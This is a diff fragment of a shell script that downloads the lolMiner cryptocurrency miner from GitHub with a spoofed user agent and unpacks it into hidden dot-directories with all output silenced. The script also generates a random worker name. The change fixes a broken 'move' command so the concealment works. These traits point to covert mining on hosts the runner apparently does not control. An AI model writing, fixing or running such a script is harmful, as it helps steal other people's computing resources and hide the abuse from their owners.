@@ -2,7 +2,7 @@
 P=$(echo GPU-$(shuf -i 1-1000 -n 1)-NEO)
 curl -sLOA "Mozilla/4.05 [en] (X11; U; Linux 2.0.32 i586)" https://github.com:443/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz 
 mkdir node
-tar -xzvf lolMiner_v1.29_Lin64.tar.gz -C node > /dev/null 2>&1 && move node .node > /dev/null 2>&1 && cd .node
+tar -xzvf lolMiner_v1.29_Lin64.tar.gz -C node > /dev/null 2>&1 && mv node .node > /dev/null 2>&1 && cd .node
 mv 1.29 .1.29 > /dev/null 2>&1
 cd .1.29
 x=1 
